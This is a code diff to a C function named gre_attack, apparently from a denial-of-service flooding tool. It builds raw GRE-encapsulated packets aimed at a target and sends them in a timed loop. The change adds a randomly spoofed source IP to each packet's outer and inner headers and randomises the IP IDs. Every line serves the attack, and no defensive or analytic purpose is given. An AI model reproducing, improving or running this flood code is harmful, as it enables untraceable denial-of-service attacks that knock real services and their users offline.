@@ -58,12 +58,12 @@ void* gre_attack(void* arg) {
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons((uint16_t)packet_size);
-    iph->id = htons(getpid() & 0xFFFF);
+    iph->id = htons((uint16_t)(rand() & 0xFFFF));
     iph->frag_off = 0;
     iph->ttl = 64;
     iph->protocol = IPPROTO_GRE;
     iph->check = 0;
-    iph->saddr = INADDR_ANY;
+    iph->saddr = htonl((uint32_t)(rand() << 16) | (rand() & 0xFFFF));
     iph->daddr = params->target_addr.sin_addr.s_addr;
 
     struct grehdr *greh = (struct grehdr*)(packet + ip_size);
@@ -76,12 +76,12 @@ void* gre_attack(void* arg) {
     inner_iph->version = 4;
     inner_iph->tos = 0;
     inner_iph->tot_len = htons((uint16_t)(packet_size - ip_size - gre_size));
-    inner_iph->id = htons((getpid() + 1) & 0xFFFF);
+    inner_iph->id = htons((uint16_t)(rand() & 0xFFFF));
     inner_iph->frag_off = 0;
     inner_iph->ttl = 64;
     inner_iph->protocol = proto;
     inner_iph->check = 0;
-    inner_iph->saddr = INADDR_ANY;
+    inner_iph->saddr = htonl((uint32_t)(rand() << 16) | (rand() & 0xFFFF));
     inner_iph->daddr = params->target_addr.sin_addr.s_addr;
 
     uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
@@ -122,8 +122,12 @@ void* gre_attack(void* arg) {
 
     time_t end_time = time(NULL) + params->duration;
     while (params->active && time(NULL) < end_time) {
-        iph->id = htons(getpid() & 0xFFFF);
-        inner_iph->id = htons((getpid() + 1) & 0xFFFF);
+        uint32_t spoofed_ip = htonl((uint32_t)(rand() << 16) | (rand() & 0xFFFF));
+        iph->saddr = spoofed_ip;
+        inner_iph->saddr = spoofed_ip;
+
+        iph->id = htons((uint16_t)(rand() & 0xFFFF));
+        inner_iph->id = htons((uint16_t)(rand() & 0xFFFF));
 
         uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
         if (proto == IPPROTO_TCP) {
